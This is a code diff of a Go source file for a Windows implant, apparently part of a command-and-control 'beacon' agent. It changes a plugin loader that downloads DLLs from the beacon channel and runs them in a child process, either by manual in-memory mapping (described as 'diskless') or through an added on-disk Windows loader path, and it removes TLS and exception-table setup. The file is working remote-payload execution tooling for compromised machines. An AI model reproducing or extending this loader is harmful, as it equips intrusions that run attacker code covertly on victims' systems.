@@ -1,17 +1,16 @@
 //go:build windows
 
-// Diskless PE plugin loader.
+// PE plugin host with an opt-in standard Windows loader path.
 //
 // Plugins are DLL images fetched over the authenticated beacon channel and
-// manually mapped into a dedicated child process. Nothing is ever written to
-// the target disk: the bytes stay in memory from the HTTP response to the
-// mapped image. A writable staging allocation is copied into a separate image
+// loaded into a dedicated child process. DLLs that export the Windows-loader
+// marker are staged on disk until the child exits. Other DLLs retain the
+// manual mapper: a writable staging allocation is copied into a separate image
 // allocation before per-section protections are applied.
 //
 // Only PE32+ amd64 images are supported. Manually mapped modules are not
 // registered with the Windows loader, so plugins must not rely on
-// GetModuleHandle(self) or CFG. x64 unwind metadata and static TLS for the
-// executing thread are initialized explicitly in the child.
+// GetModuleHandle(self), implicit TLS, C++ exceptions, or CFG.
 package main
 
 import (
@@ -49,18 +48,12 @@ const (
 )
 
 var (
-	kernel32Mod             = syscall.NewLazyDLL("kernel32.dll")
-	procVirtualAlloc        = kernel32Mod.NewProc("VirtualAlloc")
-	procVirtualFree         = kernel32Mod.NewProc("VirtualFree")
-	procLoadLibraryA        = kernel32Mod.NewProc("LoadLibraryA")
-	procGetProcAddress      = kernel32Mod.NewProc("GetProcAddress")
-	procVirtualProtect      = kernel32Mod.NewProc("VirtualProtect")
-	procVirtualQuery        = kernel32Mod.NewProc("VirtualQuery")
-	procGetCurrentThread    = kernel32Mod.NewProc("GetCurrentThread")
-	procGetProcessHeap      = kernel32Mod.NewProc("GetProcessHeap")
-	procHeapAlloc           = kernel32Mod.NewProc("HeapAlloc")
-	procRtlAddFunctionTable = syscall.NewLazyDLL("ntdll.dll").NewProc("RtlAddFunctionTable")
-	procNtQueryThread       = syscall.NewLazyDLL("ntdll.dll").NewProc("NtQueryInformationThread")
+	kernel32Mod        = syscall.NewLazyDLL("kernel32.dll")
+	procVirtualAlloc   = kernel32Mod.NewProc("VirtualAlloc")
+	procVirtualFree    = kernel32Mod.NewProc("VirtualFree")
+	procLoadLibraryA   = kernel32Mod.NewProc("LoadLibraryA")
+	procGetProcAddress = kernel32Mod.NewProc("GetProcAddress")
+	procVirtualProtect = kernel32Mod.NewProc("VirtualProtect")
 )
 
 var pluginExportPattern = regexp.MustCompile(`^[A-Za-z_][A-Za-z0-9_]{0,127}$`)
@@ -76,13 +69,20 @@ func loadPluginPE(client *http.Client, cfg *config, url, exportName, input strin
 // loadPluginPEContext is the persistent form used by channel plugins. The
 // caller owns cancellation so a long-lived pivot child cannot outlive the
 // beacon process during shutdown.
-func loadPluginPEContext(ctx context.Context, client *http.Client, cfg *config, url, exportName, input string) (string, error) {
+func loadPluginPEContext(ctx context.Context, client *http.Client, cfg *config, url, exportName, input string) (result string, resultErr error) {
 	if runtime.GOARCH != "amd64" {
 		return "", errors.New("PE plugins require the windows/amd64 agent build")
 	}
 	data, err := requestContext(ctx, client, cfg, http.MethodGet, url, values(cfg), nil)
 	if err != nil {
 		return "", fmt.Errorf("plugin download failed: %w", err)
+	}
+	if len(data) == 0 || len(data) > 512*1024*1024 || len(input) > 4096 || !pluginExportPattern.MatchString(exportName) {
+		return "", errors.New("invalid plugin size, input size, or export name")
+	}
+	useWindowsLoader, err := pluginRequiresWindowsLoader(data)
+	if err != nil {
+		return "", err
 	}
 	var frame bytes.Buffer
 	_ = binary.Write(&frame, binary.LittleEndian, uint32(len(data)))
@@ -92,6 +92,15 @@ func loadPluginPEContext(ctx context.Context, client *http.Client, cfg *config, 
 
 	cmd := exec.CommandContext(ctx, os.Args[0], "--plugin-child", exportName)
 	cmd.Stdin = &frame
+	if useWindowsLoader {
+		path, cleanup, err := stageWindowsPlugin(data)
+		if err != nil {
+			return "", err
+		}
+		defer func() { resultErr = errors.Join(resultErr, cleanup()) }()
+		cmd = exec.CommandContext(ctx, os.Args[0], "--plugin-library-child", exportName, path)
+		cmd.Stdin = strings.NewReader(input)
+	}
 	var stdout, stderr bytes.Buffer
 	cmd.Stdout = &stdout
 	cmd.Stderr = &stderr
@@ -119,8 +128,6 @@ func runPluginChild(args []string) error {
 	if len(args) != 2 || !pluginExportPattern.MatchString(args[1]) {
 		return errors.New("usage: --plugin-child <export>")
 	}
-	runtime.LockOSThread()
-	defer runtime.UnlockOSThread()
 	var pluginLen, inputLen uint32
 	if err := binary.Read(os.Stdin, binary.LittleEndian, &pluginLen); err != nil {
 		return fmt.Errorf("read plugin frame: %w", err)
@@ -199,12 +206,6 @@ func mapPluginPE(data []byte) (uintptr, error) {
 	// Copy it into the execution allocation before tightening protections.
 	copy(unsafe.Slice((*byte)(unsafe.Pointer(rxBase)), int(opt.SizeOfImage)), unsafe.Slice((*byte)(unsafe.Pointer(rwBase)), int(opt.SizeOfImage)))
 	applyPluginProtections(rxBase, file, opt)
-	if err := registerPluginUnwind(opt, rxBase); err != nil {
-		return 0, err
-	}
-	if err := initializePluginTLS(opt, rxBase); err != nil {
-		return 0, err
-	}
 	// Drop the writable staging allocation; only the protected image remains.
 	releasePluginView(rwBase)
 	committed = true
@@ -216,140 +217,6 @@ func mapPluginPE(data []byte) (uintptr, error) {
 		}
 	}
 	return rxBase, nil
-}
-
-// initializePluginTLS copies a PE static TLS template into the current
-// thread's TLS array before callbacks and DllMain run. The plugin child uses
-// this same locked OS thread for its one-shot export.
-func initializePluginTLS(opt *pe.OptionalHeader64, base uintptr) error {
-	dir := opt.DataDirectory[pe.IMAGE_DIRECTORY_ENTRY_TLS]
-	if dir.VirtualAddress == 0 || dir.Size == 0 {
-		return nil
-	}
-	if dir.Size < 40 || uint64(dir.VirtualAddress)+40 > uint64(opt.SizeOfImage) {
-		return errors.New("plugin has an invalid TLS directory")
-	}
-	fields := unsafe.Slice((*byte)(unsafe.Pointer(base+uintptr(dir.VirtualAddress))), 40)
-	start := uintptr(binary.LittleEndian.Uint64(fields[0:8]))
-	end := uintptr(binary.LittleEndian.Uint64(fields[8:16]))
-	indexAddress := uintptr(binary.LittleEndian.Uint64(fields[16:24]))
-	callbackAddress := uintptr(binary.LittleEndian.Uint64(fields[24:32]))
-	zeroFill := uintptr(binary.LittleEndian.Uint32(fields[32:36]))
-	imageEnd := base + uintptr(opt.SizeOfImage)
-	if start < base || end < start || end > imageEnd ||
-		indexAddress < base || indexAddress > imageEnd-4 ||
-		end-start+zeroFill > 8<<20 {
-		return errors.New("plugin TLS template exceeds image bounds")
-	}
-	const tlsIndex = 4096
-	const vectorBytes = (tlsIndex + 1) * 8
-	blockSize := end - start + zeroFill
-	if blockSize == 0 {
-		blockSize = 1
-	}
-	heap, _, _ := procGetProcessHeap.Call()
-	if heap == 0 {
-		return errors.New("plugin process heap is unavailable")
-	}
-	const heapZeroMemory = 0x8
-	block, _, _ := procHeapAlloc.Call(heap, heapZeroMemory, blockSize)
-	if block == 0 {
-		return errors.New("plugin TLS template allocation failed")
-	}
-	copy(unsafe.Slice((*byte)(unsafe.Pointer(block)), int(end-start)),
-		unsafe.Slice((*byte)(unsafe.Pointer(start)), int(end-start)))
-	vector, _, _ := procHeapAlloc.Call(heap, heapZeroMemory, vectorBytes)
-	if vector == 0 {
-		return errors.New("plugin TLS vector allocation failed")
-	}
-	teb, err := currentPluginTEB()
-	if err != nil {
-		return err
-	}
-	const tlsVectorOffset = 0x58 // TEB.ThreadLocalStoragePointer on Windows amd64.
-	oldVector := *(*uintptr)(unsafe.Pointer(teb + tlsVectorOffset))
-	if oldVector != 0 {
-		var info [48]byte // MEMORY_BASIC_INFORMATION on Windows amd64.
-		ret, _, _ := procVirtualQuery.Call(oldVector, uintptr(unsafe.Pointer(&info[0])), uintptr(len(info)))
-		if ret != uintptr(len(info)) {
-			return errors.New("plugin could not inspect existing TLS vector")
-		}
-		regionBase := uintptr(binary.LittleEndian.Uint64(info[0:8]))
-		regionSize := uintptr(binary.LittleEndian.Uint64(info[24:32]))
-		if regionBase > oldVector || regionSize > ^uintptr(0)-regionBase || regionBase+regionSize < oldVector {
-			return errors.New("plugin has an invalid existing TLS vector")
-		}
-		copyBytes := regionBase + regionSize - oldVector
-		if copyBytes > tlsIndex*8 {
-			copyBytes = tlsIndex * 8
-		}
-		copy(unsafe.Slice((*byte)(unsafe.Pointer(vector)), int(copyBytes)),
-			unsafe.Slice((*byte)(unsafe.Pointer(oldVector)), int(copyBytes)))
-	}
-	*(*uintptr)(unsafe.Pointer(vector + tlsIndex*8)) = block
-	*(*uint32)(unsafe.Pointer(indexAddress)) = tlsIndex
-	*(*uintptr)(unsafe.Pointer(teb + tlsVectorOffset)) = vector
-	if callbackAddress != 0 {
-		if callbackAddress < base || callbackAddress > imageEnd-8 {
-			return errors.New("plugin TLS callback array is outside the image")
-		}
-		for i := uintptr(0); i < 64; i++ {
-			entry := callbackAddress + i*8
-			if entry > imageEnd-8 {
-				return errors.New("plugin TLS callback array is unterminated")
-			}
-			callback := *(*uintptr)(unsafe.Pointer(entry))
-			if callback == 0 {
-				return nil
-			}
-			if callback < base || callback >= imageEnd {
-				return errors.New("plugin TLS callback is outside the image")
-			}
-			syscall.SyscallN(callback, base, 1, 0)
-		}
-		return errors.New("plugin TLS callback array exceeds 64 entries")
-	}
-	return nil
-}
-
-type pluginThreadBasicInformation struct {
-	exitStatus    int32
-	_             int32
-	tebBase       uintptr
-	clientProcess uintptr
-	clientThread  uintptr
-	affinityMask  uintptr
-	priority      int32
-	basePriority  int32
-}
-
-// currentPluginTEB locates the current x64 thread environment block for TLS.
-func currentPluginTEB() (uintptr, error) {
-	thread, _, _ := procGetCurrentThread.Call()
-	var info pluginThreadBasicInformation
-	status, _, _ := procNtQueryThread.Call(thread, 0,
-		uintptr(unsafe.Pointer(&info)), unsafe.Sizeof(info), 0)
-	if status != 0 || info.tebBase == 0 {
-		return 0, errors.New("plugin could not locate its thread TLS array")
-	}
-	return info.tebBase, nil
-}
-
-// registerPluginUnwind makes x64 exception metadata visible to the Windows
-// unwinder. Manually mapped images are not registered by the OS loader.
-func registerPluginUnwind(opt *pe.OptionalHeader64, base uintptr) error {
-	dir := opt.DataDirectory[pe.IMAGE_DIRECTORY_ENTRY_EXCEPTION]
-	if dir.VirtualAddress == 0 || dir.Size == 0 {
-		return nil
-	}
-	if dir.Size%12 != 0 || uint64(dir.VirtualAddress)+uint64(dir.Size) > uint64(opt.SizeOfImage) {
-		return errors.New("plugin has an invalid x64 exception directory")
-	}
-	ret, _, _ := procRtlAddFunctionTable.Call(base+uintptr(dir.VirtualAddress), uintptr(dir.Size/12), base)
-	if ret == 0 {
-		return errors.New("RtlAddFunctionTable failed for plugin image")
-	}
-	return nil
 }
 
 // mapPluginViews allocates separate writable staging and execution images.
@@ -556,6 +423,11 @@ func callPluginExport(base uintptr, exportName, input string) (string, error) {
 	if err != nil {
 		return "", err
 	}
+	return invokePluginExport(addr, exportName, input)
+}
+
+// invokePluginExport implements the shared bounded Run ABI for either loader.
+func invokePluginExport(addr uintptr, exportName, input string) (string, error) {
 	inputBytes := make([]byte, len(input)+1)
 	copy(inputBytes, input)
 	output := make([]byte, pluginOutputBytes)
